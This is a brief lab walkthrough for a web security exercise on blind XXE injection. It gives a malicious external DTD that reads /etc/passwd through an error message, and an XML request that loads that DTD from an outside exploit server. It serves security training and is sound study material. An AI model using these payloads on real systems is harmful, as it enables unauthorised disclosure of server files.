# Exploiting blind XXE to retrieve data via error messages

## This lab has a "Check stock" feature that parses XML input but does not display the result.

## To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

## The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

---

### step 1

copy the line below to exploit url

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

save and click on exploite

note down exploit url
https://exploit-0a3c000704fe7e1fc75652b1019d0014.exploit-server.net/exploit

step2
copy to xml file
https://exploit-0a3c000704fe7e1fc75652b1019d0014.exploit-server.net/exploit

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a3c000704fe7e1fc75652b1019d0014.exploit-server.net/exploit"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

send request
